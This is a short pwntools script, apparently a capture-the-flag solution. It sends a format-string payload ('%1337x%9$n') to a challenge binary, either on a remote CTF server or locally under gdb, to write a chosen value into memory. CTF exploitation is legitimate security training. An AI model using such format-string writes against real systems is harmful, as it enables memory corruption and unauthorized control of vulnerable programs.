from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10009
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *main+98
        b *main+132
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')
# target_address = p64(e.symbols["target"])
payload = b'%1337x%9$n'
p.sendline(payload)

if LOCAL:
    sleep(5)
    print(p.recv().decode())
    pause()
else:
    print(p.recvall().decode())
